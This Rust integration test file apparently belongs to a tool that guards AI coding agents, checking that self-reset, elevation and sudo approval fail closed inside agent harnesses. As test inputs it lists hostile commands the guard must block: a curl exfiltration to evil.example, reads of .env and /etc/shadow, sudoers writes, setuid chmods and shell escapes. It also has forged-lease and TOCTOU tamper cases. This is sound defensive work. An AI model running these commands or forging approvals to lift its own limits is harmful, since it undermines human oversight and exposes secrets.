#![forbid(unsafe_code)]

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

use agent_guard::diagnostics::{GuardCode, all_explanations, lookup_explanation};
use agent_guard::json::JsonValue;
use agent_guard::work_ledger::validate_two_plus_two_sentences;

fn workspace_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .to_path_buf()
}

fn fresh_sandbox_dir(name: &str) -> PathBuf {
    let base = workspace_root().join("target").join("tw2").join(name);
    if base.exists() {
        // Restore write bits on any 0444 files from prior runs before cleaning.
        #[cfg(unix)]
        {
            let _ = Command::new("chmod")
                .args(["-R", "u+w"])
                .arg(&base)
                .status();
        }
        let _ = fs::remove_dir_all(&base);
    }
    fs::create_dir_all(&base).expect("create sandbox dir");
    base
}

#[test]
fn diagnostics_catalog_covers_typed_codes_and_explain_cli() {
    let catalog = all_explanations();
    assert!(
        catalog.len() >= 33,
        "expected >= 33 cataloged guard codes, got {}",
        catalog.len()
    );
    for entry in catalog {
        assert_eq!(entry.variant.as_str(), entry.code);
        assert_eq!(GuardCode::from_code_str(entry.code), Some(entry.variant));
        assert!(!entry.summary.is_empty());
        assert!(!entry.rationale.is_empty());
        assert!(!entry.remediation.is_empty());
    }

    let fuzzy = lookup_explanation("hop-limit").expect("fuzzy lookup hop-limit");
    assert_eq!(fuzzy.variant, GuardCode::TransitiveHopLimitExceeded);

    let dotagent_bin = env!("CARGO_BIN_EXE_dotagent");
    let ver_out = Command::new(dotagent_bin)
        .arg("--version")
        .output()
        .expect("dotagent --version");
    assert!(ver_out.status.success());
    let ver_txt = String::from_utf8_lossy(&ver_out.stdout);
    assert!(
        ver_txt.starts_with("dotagent "),
        "unexpected version banner: {ver_txt}"
    );

    let list_out = Command::new(dotagent_bin)
        .args(["explain", "--list", "--json"])
        .output()
        .expect("dotagent explain --list --json");
    assert!(list_out.status.success());
    let parsed_list =
        JsonValue::parse(&String::from_utf8_lossy(&list_out.stdout)).expect("valid JSON list");
    assert!(
        parsed_list.as_array().is_some_and(|a| a.len() >= 33),
        "expected >= 33 JSON entries"
    );

    let single_out = Command::new(dotagent_bin)
        .args(["guard", "explain", "CORRUPT_SESSION_STATE", "--json"])
        .output()
        .expect("dotagent guard explain");
    assert!(single_out.status.success());
    let parsed_single =
        JsonValue::parse(&String::from_utf8_lossy(&single_out.stdout)).expect("valid JSON object");
    assert_eq!(
        parsed_single.get("code").and_then(JsonValue::as_str),
        Some("CORRUPT_SESSION_STATE")
    );
    assert_eq!(
        parsed_single.get("severity").and_then(JsonValue::as_str),
        Some("CIRCUIT_BREAKER")
    );
}

#[test]
fn doctor_json_and_session_reset_fail_closed_gates() {
    let sb = fresh_sandbox_dir("doc_rst");
    let home = sb.join("h");
    fs::create_dir_all(&home).expect("create home");

    let dotagent_bin = env!("CARGO_BIN_EXE_dotagent");
    let root = workspace_root();

    let doc_out = Command::new(dotagent_bin)
        .args(["doctor", "--json"])
        .arg(&root)
        .current_dir(&root)
        .env("HOME", &home)
        .env("GIT_CONFIG_GLOBAL", root.join("dist/gitconfig.hardened"))
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .expect("dotagent doctor --json");
    assert!(
        doc_out.status.success(),
        "doctor failed: stdout={} stderr={}",
        String::from_utf8_lossy(&doc_out.stdout),
        String::from_utf8_lossy(&doc_out.stderr)
    );
    let doc_json =
        JsonValue::parse(&String::from_utf8_lossy(&doc_out.stdout)).expect("parse doctor JSON");
    assert_eq!(
        doc_json.get("healthy").and_then(JsonValue::as_bool),
        Some(true)
    );
    assert_eq!(
        doc_json
            .get("checks")
            .and_then(JsonValue::as_array)
            .map(<[JsonValue]>::len),
        Some(7)
    );

    // Gate 1: Non-TTY piped invocation MUST fail closed so agents cannot self-reset halts.
    let non_tty = Command::new(dotagent_bin)
        .arg("session-reset")
        .current_dir(&root)
        .env("HOME", &home)
        .output()
        .expect("session-reset piped");
    assert_eq!(non_tty.status.code(), Some(2));
    assert!(
        String::from_utf8_lossy(&non_tty.stderr).contains("SESSION_RESET_REQUIRES_HUMAN_TTY"),
        "expected TTY gate error, got: {}",
        String::from_utf8_lossy(&non_tty.stderr)
    );

    // Gate 2: Sandbox env var MUST fail closed immediately.
    let in_sbx = Command::new(dotagent_bin)
        .arg("session-reset")
        .current_dir(&root)
        .env("HOME", &home)
        .env("AGENT_GUARD_IN_SANDBOX", "1")
        .output()
        .expect("session-reset in sandbox");
    assert_eq!(in_sbx.status.code(), Some(2));
    assert!(
        String::from_utf8_lossy(&in_sbx.stderr).contains("SESSION_RESET_DENIED_IN_SANDBOX"),
        "expected sandbox gate error, got: {}",
        String::from_utf8_lossy(&in_sbx.stderr)
    );
}

#[test]
fn activate_and_deactivate_preserve_user_prefs_backups_zsh_and_pinned_hooks() {
    let sb = fresh_sandbox_dir("act_deact");
    let home = sb.join("h");
    let bin_dir = home.join(".local/bin");
    let ext_ws = sb.join("ext_repo");
    fs::create_dir_all(&bin_dir).expect("create bin_dir");
    fs::create_dir_all(ext_ws.join(".claude")).expect("create ext_ws/.claude");
    fs::write(home.join(".bashrc"), "# initial bashrc\n").expect("write .bashrc");

    // Initialize external git workspace so `activate` runs `audit_repository` on it too.
    let init_st = Command::new("git")
        .arg("init")
        .arg(&ext_ws)
        .env("HOME", &home)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .status()
        .expect("git init ext_ws");
    assert!(init_st.success());

    // Stage fake installed agent-guard binary at ~/.local/bin/agent-guard for GUI hook pinning.
    let guard_bin_src = env!("CARGO_BIN_EXE_agent-guard");
    let installed_guard = bin_dir.join("agent-guard");
    fs::copy(guard_bin_src, &installed_guard).expect("copy agent-guard");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&installed_guard, fs::Permissions::from_mode(0o555))
            .expect("chmod 0555 agent-guard");
    }

    // Seed pre-existing user files in external workspace & ~/.gemini to test non-destructive merge + backup.
    let orig_agents = "# Pre-existing project notes\n";
    let orig_claude_settings =
        "{\n  \"theme\": \"solarized-dark\",\n  \"model\": \"claude-opus\"\n}\n";
    fs::write(ext_ws.join("AGENTS.md"), orig_agents).expect("seed AGENTS.md");
    fs::write(ext_ws.join(".claude/settings.json"), orig_claude_settings)
        .expect("seed .claude/settings.json");

    let dotagent_bin = env!("CARGO_BIN_EXE_dotagent");
    let root = workspace_root();

    // Run `dotagent activate` twice to prove idempotency and that `.dotagent.bak` keeps the ORIGINAL user bytes.
    for _ in 0..2 {
        let act_out = Command::new(dotagent_bin)
            .args(["activate", "--dotagent-root"])
            .arg(&root)
            .arg("--workspace")
            .arg(&ext_ws)
            .arg("--bin-dir")
            .arg(&bin_dir)
            .env("HOME", &home)
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .output()
            .expect("dotagent activate");
        assert!(
            act_out.status.success(),
            "activate failed: stdout={} stderr={}",
            String::from_utf8_lossy(&act_out.stdout),
            String::from_utf8_lossy(&act_out.stderr)
        );
    }

    // 1. `.zshenv` and `.bashrc` both have `~/.local/bin` PATH configured.
    let zshenv = fs::read_to_string(home.join(".zshenv")).expect("read .zshenv");
    assert!(zshenv.contains(".local/bin"));
    let bashrc = fs::read_to_string(home.join(".bashrc")).expect("read .bashrc");
    assert!(bashrc.contains(".local/bin"));

    // 2. `.dotagent.bak` preserved original user files across repeated activations.
    assert_eq!(
        fs::read_to_string(ext_ws.join("AGENTS.md.dotagent.bak"))
            .expect("read AGENTS.md.dotagent.bak"),
        orig_agents
    );
    assert_eq!(
        fs::read_to_string(ext_ws.join(".claude/settings.json.dotagent.bak"))
            .expect("read settings.json.dotagent.bak"),
        orig_claude_settings
    );

    // 3. Deployed `.claude/settings.json` preserved user preferences AND pinned absolute `<bin_dir>/agent-guard`!
    let merged_claude_raw =
        fs::read_to_string(ext_ws.join(".claude/settings.json")).expect("read merged claude");
    let merged_claude = JsonValue::parse(&merged_claude_raw).expect("parse merged claude JSON");
    assert_eq!(
        merged_claude.get("theme").and_then(JsonValue::as_str),
        Some("solarized-dark")
    );
    assert_eq!(
        merged_claude.get("model").and_then(JsonValue::as_str),
        Some("claude-opus")
    );
    assert!(
        merged_claude_raw.contains(&installed_guard.display().to_string()),
        "expected pinned absolute guard path in .claude/settings.json, got: {merged_claude_raw}"
    );

    // 4. Cursor `.cursor/hooks.json` also has pinned absolute binary path for GUI IDEs.
    let cursor_hooks_raw =
        fs::read_to_string(ext_ws.join(".cursor/hooks.json")).expect("read cursor hooks.json");
    assert!(
        cursor_hooks_raw.contains(&installed_guard.display().to_string()),
        "expected pinned absolute guard path in .cursor/hooks.json, got: {cursor_hooks_raw}"
    );

    // 5. `dotagent deactivate --workspace <ext_ws>` restores `.dotagent.bak` files and cleans deployed 0444 files!
    let deact_out = Command::new(dotagent_bin)
        .args(["deactivate", "--workspace"])
        .arg(&ext_ws)
        .env("HOME", &home)
        .output()
        .expect("dotagent deactivate");
    assert!(
        deact_out.status.success(),
        "deactivate failed: {}",
        String::from_utf8_lossy(&deact_out.stderr)
    );

    assert_eq!(
        fs::read_to_string(ext_ws.join("AGENTS.md")).expect("restored AGENTS.md"),
        orig_agents
    );
    assert_eq!(
        fs::read_to_string(ext_ws.join(".claude/settings.json")).expect("restored settings.json"),
        orig_claude_settings
    );
    assert!(!ext_ws.join("AGENTS.md.dotagent.bak").exists());
    assert!(!ext_ws.join(".cursor/hooks.json").exists());
    assert!(!ext_ws.join(".claude/agents/swarm-master.md").exists());
}

#[test]
fn two_plus_two_sentence_counter_accepts_abbreviations_and_versions() {
    let summary = "Hardened Landlock V4 TCP isolation (e.g. --deny-net on Linux 6.7+ and v1.0 profiles) and drained child stdout/stderr pipes to EOF. Eliminated SIGPIPE race conditions (i.e. > 24 KiB test outputs vs. early pipe close, cf. issue no. 42).";
    let rationale = "Audited crypto primitives (sha2 v0.10.8, approx. 0.1 ms overhead) replace custom SHA-256 while keeping Cargo.lock 100% offline. Privilege separation on coord.sock blocks worker HMAC oracle forgery etc. across all 6 Swarm roles.";

    validate_two_plus_two_sentences(summary, rationale)
        .expect("technical prose with abbreviations and decimals must pass 2+2 validation");

    // Genuine 1-sentence and 3-sentence inputs must still be rejected deterministically.
    assert!(validate_two_plus_two_sentences("Only a single sentence here.", rationale).is_err());
    assert!(
        validate_two_plus_two_sentences(
            "First sentence here. Second sentence here. Third sentence here.",
            rationale
        )
        .is_err()
    );
}

#[test]
fn elevate_cli_enforces_human_tty_and_sandbox_locks_and_timeboxed_power_lease_preserves_hard_walls()
{
    let sb = fresh_sandbox_dir("elevate_lease_ux");
    let home = sb.join("h");
    let state_dir = sb.join("guard_state");
    let repo = sb.join("local_repo");
    fs::create_dir_all(&home).expect("mkdir home");
    fs::create_dir_all(&state_dir).expect("mkdir state_dir");
    fs::create_dir_all(repo.join("src/d1/d2/d3/d4/d5")).expect("mkdir deep src");
    fs::create_dir_all(repo.join("scripts")).expect("mkdir scripts");

    let init_st = Command::new("git")
        .arg("init")
        .arg(&repo)
        .env("HOME", &home)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .status()
        .expect("git init local_repo");
    assert!(init_st.success());

    fs::write(repo.join("AGENTS.md"), "# Canonical Root Authority\n").expect("write AGENTS.md");
    fs::write(repo.join(".env"), "API_TOKEN=topsecret\n").expect("write .env");
    fs::write(repo.join("scripts/local_tool.py"), "print('ok')\n").expect("write local_tool.py");
    let mut big_lines = String::new();
    for i in 1..=420 {
        big_lines.push_str(&format!("pub fn line_fn_{i}() -> usize {{ {i} }}\n"));
    }
    fs::write(repo.join("src/big_mod.rs"), &big_lines).expect("write big_mod.rs");
    fs::write(
        repo.join("src/hop1.rs"),
        "// Points to `src/hop2.rs` next.\npub fn h1() {}\n",
    )
    .expect("write hop1");
    fs::write(
        repo.join("src/hop2.rs"),
        "// Points to `src/hop3.rs` next.\npub fn h2() {}\n",
    )
    .expect("write hop2");
    fs::write(
        repo.join("src/hop3.rs"),
        "// Points to `src/hop4.rs` next.\npub fn h3() {}\n",
    )
    .expect("write hop3");
    fs::write(repo.join("src/hop4.rs"), "pub fn h4() {}\n").expect("write hop4");

    let dotagent_bin = env!("CARGO_BIN_EXE_dotagent");
    let guard_bin = env!("CARGO_BIN_EXE_agent-guard");

    // 1. Fail-closed CLI gates: non-TTY, sandbox, and AI harness markers MUST all exit 2!
    let non_tty = Command::new(dotagent_bin)
        .arg("elevate")
        .current_dir(&repo)
        .env("HOME", &home)
        .env("AGENT_GUARD_STATE_DIR", &state_dir)
        .env_remove("CLAUDECODE")
        .env_remove("ANTIGRAVITY_AGENT")
        .output()
        .expect("elevate non-tty");
    assert_eq!(non_tty.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&non_tty.stderr).contains("ELEVATE_REQUIRES_HUMAN_TTY"));

    for sub in ["elevate", "activate", "deactivate"] {
        let in_sbx = Command::new(dotagent_bin)
            .arg(sub)
            .current_dir(&repo)
            .env("HOME", &home)
            .env("AGENT_GUARD_STATE_DIR", &state_dir)
            .env("AGENT_GUARD_IN_SANDBOX", "1")
            .output()
            .expect("operator cmd in sandbox");
        assert_eq!(in_sbx.status.code(), Some(2), "sub={sub}");
        assert!(
            String::from_utf8_lossy(&in_sbx.stderr).contains("_DENIED_IN_SANDBOX"),
            "sub={sub} stderr={}",
            String::from_utf8_lossy(&in_sbx.stderr)
        );
    }

    for marker in ["CLAUDECODE", "GEMINI_CLI", "ANTIGRAVITY_AGENT"] {
        let in_harness = Command::new(dotagent_bin)
            .arg("elevate")
            .current_dir(&repo)
            .env("HOME", &home)
            .env("AGENT_GUARD_STATE_DIR", &state_dir)
            .env(marker, "1")
            .output()
            .expect("elevate in harness");
        assert_eq!(in_harness.status.code(), Some(2), "marker={marker}");
        assert!(String::from_utf8_lossy(&in_harness.stderr).contains("ELEVATE_DENIED_IN_HARNESS"));
    }

    let cwd_s = repo.to_string_lossy().into_owned();
    let run_pre_tool = |sid: &str, tool: &str, input: JsonValue| -> (Option<i32>, String) {
        let payload = JsonValue::Object(vec![
            ("session_id".to_string(), JsonValue::Str(sid.to_string())),
            ("cwd".to_string(), JsonValue::Str(cwd_s.clone())),
            ("tool_name".to_string(), JsonValue::Str(tool.to_string())),
            ("tool_input".to_string(), input),
        ])
        .to_json_string();
        let out = Command::new(guard_bin)
            .args(["pre-tool", "--json", &payload])
            .current_dir(&repo)
            .env("HOME", &home)
            .env("AGENT_GUARD_STATE_DIR", &state_dir)
            .output()
            .expect("run pre-tool subprocess");
        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        (out.status.code(), combined)
    };

    // 2. Before elevation: deep walk (depth 6), 350-line Read, and python3 script are blocked!
    let (code_deep_before, out_deep_before) = run_pre_tool(
        "s_pre_elev",
        "Grep",
        JsonValue::Object(vec![
            ("path".to_string(), JsonValue::Str("src".to_string())),
            ("pattern".to_string(), JsonValue::Str("fn".to_string())),
            ("max_depth".to_string(), JsonValue::Uint(6)),
        ]),
    );
    assert_eq!(code_deep_before, Some(2));
    assert!(out_deep_before.contains("MAX_TRAVERSAL_DEPTH_EXCEEDED"));

    let (code_py_before, _) = run_pre_tool(
        "s_pre_elev",
        "Bash",
        JsonValue::Object(vec![(
            "command".to_string(),
            JsonValue::Str("python3 scripts/local_tool.py".to_string()),
        )]),
    );
    assert_eq!(code_py_before, Some(2));

    // 3. Stage authenticated 10-minute elevated lease under `$HOME/.local/state/agent-guard/elevated`:
    let canon_repo = fs::canonicalize(&repo).expect("canon repo");
    let canon_repo_s = canon_repo.to_string_lossy().into_owned();
    let repo_hash = agent_guard::crypto::sha256_hex(canon_repo_s.as_bytes());
    let elev_dir = home.join(".local/state/agent-guard/elevated");
    fs::create_dir_all(&elev_dir).expect("mkdir elev_dir");
    let host_key = [0x5Au8; 32];
    fs::write(elev_dir.join("host.key"), host_key).expect("write host.key");
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("epoch")
        .as_secs();
    let expires = now + 600;
    let mut mac_payload = Vec::new();
    mac_payload.extend_from_slice(b"dotagent.elevated.v1\0");
    mac_payload.extend_from_slice(&host_key);
    mac_payload.push(0);
    mac_payload.extend_from_slice(canon_repo_s.as_bytes());
    mac_payload.push(0);
    mac_payload.extend_from_slice(&now.to_be_bytes());
    mac_payload.extend_from_slice(&expires.to_be_bytes());
    let mac_hex = agent_guard::crypto::sha256_hex(&mac_payload);
    let lease_path = elev_dir.join(format!("{repo_hash}.json"));
    let valid_lease_json = JsonValue::Object(vec![
        (
            "schema".to_string(),
            JsonValue::Str("dotagent.elevated.v1".to_string()),
        ),
        (
            "repo_root".to_string(),
            JsonValue::Str(canon_repo_s.clone()),
        ),
        ("issued_at_unix".to_string(), JsonValue::Uint(now)),
        ("expires_at_unix".to_string(), JsonValue::Uint(expires)),
        ("mac".to_string(), JsonValue::Str(mac_hex)),
    ])
    .to_json_string();
    fs::write(&lease_path, &valid_lease_json).expect("write valid lease");

    let run_elev_pre_tool = |sid: &str, tool: &str, input: JsonValue| -> (Option<i32>, String) {
        let payload = JsonValue::Object(vec![
            ("session_id".to_string(), JsonValue::Str(sid.to_string())),
            ("cwd".to_string(), JsonValue::Str(cwd_s.clone())),
            ("tool_name".to_string(), JsonValue::Str(tool.to_string())),
            ("tool_input".to_string(), input),
        ])
        .to_json_string();
        let out = Command::new(guard_bin)
            .args(["pre-tool", "--json", &payload])
            .current_dir(&repo)
            .env("HOME", &home)
            .output()
            .expect("run elevated pre-tool");
        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        (out.status.code(), combined)
    };

    // 4. While elevated: depth-12 Grep, 380-line Read, 4-hop chain (hop1->hop2->hop3->hop4),
    //    8 consecutive discovery calls, and vetted local python3 ALL succeed!
    for idx in 0..8 {
        let (code, detail) = run_elev_pre_tool(
            "s_elev_ok",
            "Grep",
            JsonValue::Object(vec![
                ("path".to_string(), JsonValue::Str("src".to_string())),
                (
                    "pattern".to_string(),
                    JsonValue::Str(format!("line_fn_{idx}")),
                ),
                ("max_depth".to_string(), JsonValue::Uint(12)),
            ]),
        );
        assert_eq!(code, Some(0), "elevated deep Grep #{idx} failed: {detail}");
    }

    let (slice_code, slice_detail) = run_elev_pre_tool(
        "s_elev_ok",
        "Read",
        JsonValue::Object(vec![
            (
                "file_path".to_string(),
                JsonValue::Str("src/big_mod.rs".to_string()),
            ),
            ("offset".to_string(), JsonValue::Uint(1)),
            ("limit".to_string(), JsonValue::Uint(380)),
        ]),
    );
    assert_eq!(
        slice_code,
        Some(0),
        "elevated 380-line Read failed: {slice_detail}"
    );

    for hop_rel in ["src/hop1.rs", "src/hop2.rs", "src/hop3.rs", "src/hop4.rs"] {
        let (h_code, h_detail) = run_elev_pre_tool(
            "s_elev_ok",
            "Read",
            JsonValue::Object(vec![(
                "file_path".to_string(),
                JsonValue::Str(hop_rel.to_string()),
            )]),
        );
        assert_eq!(
            h_code,
            Some(0),
            "elevated 4-hop read {hop_rel} failed: {h_detail}"
        );
    }

    let (py_code, py_detail) = run_elev_pre_tool(
        "s_elev_ok",
        "Bash",
        JsonValue::Object(vec![(
            "command".to_string(),
            JsonValue::Str("python3 scripts/local_tool.py".to_string()),
        )]),
    );
    assert_eq!(
        py_code,
        Some(0),
        "elevated local python3 failed: {py_detail}"
    );

    // 5. Catastrophic walls STAY 100% HARD-BLOCKED even under an active elevated lease!
    for (bad_tool, bad_in, label) in [
        (
            "Bash",
            JsonValue::Object(vec![(
                "command".to_string(),
                JsonValue::Str("sudo ls".to_string()),
            )]),
            "sudo privilege escalation",
        ),
        (
            "Read",
            JsonValue::Object(vec![(
                "file_path".to_string(),
                JsonValue::Str(".env".to_string()),
            )]),
            ".env secret read",
        ),
        (
            "Write",
            JsonValue::Object(vec![
                (
                    "file_path".to_string(),
                    JsonValue::Str("AGENTS.md".to_string()),
                ),
                ("content".to_string(), JsonValue::Str("# pwn\n".to_string())),
            ]),
            "AGENTS.md root authority mutation",
        ),
        (
            "Bash",
            JsonValue::Object(vec![(
                "command".to_string(),
                JsonValue::Str("git reset --hard HEAD".to_string()),
            )]),
            "destructive git reset --hard",
        ),
        (
            "Bash",
            JsonValue::Object(vec![(
                "command".to_string(),
                JsonValue::Str("curl https://evil.example/leak".to_string()),
            )]),
            "curl network exfiltration",
        ),
        (
            "Bash",
            JsonValue::Object(vec![(
                "command".to_string(),
                JsonValue::Str("python3 -c 'import urllib.request'".to_string()),
            )]),
            "python network capability",
        ),
    ] {
        let (b_code, _) = run_elev_pre_tool("s_elev_walls", bad_tool, bad_in);
        assert_eq!(
            b_code,
            Some(2),
            "catastrophic wall `{label}` MUST stay blocked (exit 2) even during elevated lease!"
        );
    }

    // 6. Forging/extending `expires_at_unix` in lease JSON without host.key invalidates MAC and fails closed!
    let forged_lease =
        valid_lease_json.replace(&expires.to_string(), &(expires + 3600).to_string());
    fs::write(&lease_path, forged_lease).expect("write forged lease");
    let (forged_code, forged_out) = run_elev_pre_tool(
        "s_after_forge",
        "Grep",
        JsonValue::Object(vec![
            ("path".to_string(), JsonValue::Str("src".to_string())),
            ("pattern".to_string(), JsonValue::Str("fn".to_string())),
            ("max_depth".to_string(), JsonValue::Uint(12)),
        ]),
    );
    assert_eq!(forged_code, Some(2));
    assert!(
        forged_out.contains("MAX_TRAVERSAL_DEPTH_EXCEEDED"),
        "tampered elevated lease MAC must fail closed back to depth 2, got: {forged_out}"
    );
}

#[test]
fn sudo_broker_stages_pinned_argv_blocks_shells_secrets_and_toctou_and_scrubs_output() {
    let sb = fresh_sandbox_dir("sudo_broker_ux");
    let home = sb.join("h");
    let repo = sb.join("host_cfg_repo");
    fs::create_dir_all(&home).expect("mkdir home");
    fs::create_dir_all(repo.join("ops")).expect("mkdir ops");

    let init_st = Command::new("git")
        .arg("init")
        .arg(&repo)
        .env("HOME", &home)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .status()
        .expect("git init host_cfg_repo");
    assert!(init_st.success());

    fs::write(repo.join("AGENTS.md"), "# Canonical Root Authority\n").expect("write AGENTS.md");
    let orig_sysctl = "net.ipv4.ip_forward = 1\n";
    fs::write(repo.join("ops/99-forward.conf"), orig_sysctl).expect("write sysctl");

    let dotagent_bin = env!("CARGO_BIN_EXE_dotagent");
    let guard_bin = env!("CARGO_BIN_EXE_agent-guard");
    let cwd_s = repo.to_string_lossy().into_owned();

    // 1. Human-presence gates on `dotagent approve`: non-TTY, sandbox, and AI harness markers MUST exit 2!
    let non_tty_app = Command::new(dotagent_bin)
        .arg("approve")
        .current_dir(&repo)
        .env("HOME", &home)
        .env_remove("CLAUDECODE")
        .env_remove("ANTIGRAVITY_AGENT")
        .output()
        .expect("approve non-tty");
    assert_eq!(non_tty_app.status.code(), Some(2));
    assert!(
        String::from_utf8_lossy(&non_tty_app.stderr).contains("SUDO_APPROVE_REQUIRES_HUMAN_TTY")
    );

    let sbx_app = Command::new(dotagent_bin)
        .arg("approve")
        .current_dir(&repo)
        .env("HOME", &home)
        .env("AGENT_GUARD_IN_SANDBOX", "1")
        .output()
        .expect("approve in sandbox");
    assert_eq!(sbx_app.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&sbx_app.stderr).contains("SUDO_APPROVE_DENIED_IN_SANDBOX"));

    let harness_app = Command::new(dotagent_bin)
        .arg("approve")
        .current_dir(&repo)
        .env("HOME", &home)
        .env("CLAUDECODE", "1")
        .output()
        .expect("approve in harness");
    assert_eq!(harness_app.status.code(), Some(2));
    assert!(
        String::from_utf8_lossy(&harness_app.stderr).contains("SUDO_APPROVE_DENIED_IN_HARNESS")
    );

    let run_bash_hook = |sid: &str, cmd: &str| -> (Option<i32>, String) {
        let payload = JsonValue::Object(vec![
            ("session_id".to_string(), JsonValue::Str(sid.to_string())),
            ("cwd".to_string(), JsonValue::Str(cwd_s.clone())),
            ("tool_name".to_string(), JsonValue::Str("Bash".to_string())),
            (
                "tool_input".to_string(),
                JsonValue::Object(vec![(
                    "command".to_string(),
                    JsonValue::Str(cmd.to_string()),
                )]),
            ),
        ])
        .to_json_string();
        let out = Command::new(guard_bin)
            .args(["pre-tool", "--json", &payload])
            .current_dir(&repo)
            .env("HOME", &home)
            .output()
            .expect("run pre-tool bash");
        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        (out.status.code(), combined)
    };

    // 2. Agent attempting `dotagent approve`, `sudo`, shells, interpreters, or sensitive targets in `sudo-request` is HARD-BLOCKED!
    for (bad_cmd, expected_code) in [
        ("dotagent approve", "SELF_TAMPERING_BLOCKED"),
        (
            "dotagent sudo-request -- bash -c 'id'",
            "SUDO_SHELL_OR_EVAL_FORBIDDEN",
        ),
        (
            "dotagent sudo-request -- python3 -c 'print(1)'",
            "SUDO_SHELL_OR_EVAL_FORBIDDEN",
        ),
        (
            "dotagent sudo-request -- find /etc -exec sh -c id \\;",
            "SUDO_SHELL_OR_EVAL_FORBIDDEN",
        ),
        (
            "dotagent sudo-request -- cat /etc/shadow",
            "SUDO_SENSITIVE_TARGET_FORBIDDEN",
        ),
        (
            "dotagent sudo-request -- cp ops/99-forward.conf /etc/sudoers.d/pwn",
            "SUDO_SENSITIVE_TARGET_FORBIDDEN",
        ),
        (
            "dotagent sudo-request -- chmod 4755 /bin/cp",
            "SUDO_SENSITIVE_TARGET_FORBIDDEN",
        ),
        (
            "dotagent sudo-request -- install --mode=4755 ops/99-forward.conf /usr/local/bin/x",
            "SUDO_SENSITIVE_TARGET_FORBIDDEN",
        ),
        (
            "dotagent sudo-request -- chmod u=s /bin/cp",
            "SUDO_SENSITIVE_TARGET_FORBIDDEN",
        ),
        (
            "dotagent sudo-request -- chmod 06755 /bin/cp",
            "SUDO_SENSITIVE_TARGET_FORBIDDEN",
        ),
        (
            "dotagent sudo-request -- cp ops/99-forward.conf AGENTS.md",
            "SUDO_SENSITIVE_TARGET_FORBIDDEN",
        ),
    ] {
        let (code, detail) = run_bash_hook(&format!("s_bad_{expected_code}"), bad_cmd);
        assert_eq!(code, Some(2), "expected exit 2 for `{bad_cmd}`: {detail}");
        assert!(
            detail.contains(expected_code),
            "expected `{expected_code}` for `{bad_cmd}`, got: {detail}"
        );
    }

    // 3. Valid `dotagent sudo-request` stages MAC-signed ticket with pinned SHA-256 of `ops/99-forward.conf`!
    let (ok_code, ok_out) = run_bash_hook(
        "s_sudo_flow",
        "dotagent sudo-request --reason 'Apply IPv4 forwarding sysctl' -- install -m 0644 ops/99-forward.conf /etc/sysctl.d/99-forward.conf",
    );
    assert_eq!(ok_code, Some(0), "valid sudo-request failed: {ok_out}");
    let req_start = ok_out.find("req_").expect("ticket req_id in output");
    let req_id = &ok_out[req_start..req_start + 20];
    assert_eq!(req_id.len(), 20);

    // Before approval, `sudo-result` reports PENDING_HUMAN_APPROVAL!
    let (pend_code, pend_out) =
        run_bash_hook("s_sudo_flow", &format!("dotagent sudo-result {req_id}"));
    assert_eq!(pend_code, Some(0));
    assert!(pend_out.contains("STATUS=PENDING_HUMAN_APPROVAL"));

    // 4. TOCTOU Race Defense: modifying `ops/99-forward.conf` after staging MUST abort execution!
    let broker_dir = home.join(".local/state/agent-guard/sudo-broker");
    fs::write(
        repo.join("ops/99-forward.conf"),
        "net.ipv4.ip_forward = 1\n# sneaky post-request mutation\n",
    )
    .expect("tamper staged file");
    let toctou_err = agent_guard::sudo_broker::verify_and_execute_sudo_ticket_in_dir(
        &broker_dir,
        req_id,
        Some("/bin/echo"),
    )
    .expect_err("TOCTOU file modification must abort sudo execution");
    assert!(
        toctou_err.contains("SUDO_FILE_TOCTOU_MISMATCH"),
        "unexpected error: {toctou_err}"
    );

    // Restore exact original bytes -> execution succeeds once, and replay is rejected!
    fs::write(repo.join("ops/99-forward.conf"), orig_sysctl).expect("restore staged file");
    let receipt = agent_guard::sudo_broker::verify_and_execute_sudo_ticket_in_dir(
        &broker_dir,
        req_id,
        Some("/bin/echo"),
    )
    .expect("verified ticket executes cleanly");
    assert_eq!(receipt.exit_code, 0);
    assert!(
        receipt
            .sanitized_output
            .contains("/etc/sysctl.d/99-forward.conf")
    );

    let replay_err = agent_guard::sudo_broker::verify_and_execute_sudo_ticket_in_dir(
        &broker_dir,
        req_id,
        Some("/bin/echo"),
    )
    .expect_err("executed ticket cannot be replayed");
    assert!(replay_err.contains("cannot be replayed"));

    // Agent now reads `STATUS=EXECUTED` via `dotagent sudo-result <req_id>`!
    let (done_code, done_out) =
        run_bash_hook("s_sudo_flow", &format!("dotagent sudo-result {req_id}"));
    assert_eq!(done_code, Some(0));
    assert!(done_out.contains("STATUS=EXECUTED"));

    // 5. Secret Scrubbing Defense: if privileged output contains a private key literal, it is redacted!
    let (_, leak_out) = run_bash_hook(
        "s_sudo_scrub",
        "dotagent sudo-request --reason 'Test output secret scrubber' -- systemctl status demo",
    );
    let leak_idx = leak_out.find("req_").expect("second req_id");
    let leak_id = &leak_out[leak_idx..leak_idx + 20];
    let fake_key_printer = sb.join("print_secret.sh");
    fs::write(
        &fake_key_printer,
        "#!/bin/sh\necho '-----BEGIN OPENSSH PRIVATE KEY-----'\necho 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmU='\n",
    )
    .expect("write fake_key_printer");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&fake_key_printer, fs::Permissions::from_mode(0o755))
            .expect("chmod +x");
    }
    let scrubbed = agent_guard::sudo_broker::verify_and_execute_sudo_ticket_in_dir(
        &broker_dir,
        leak_id,
        Some(fake_key_printer.to_str().expect("utf8 path")),
    )
    .expect("execute secret-printing test runner");
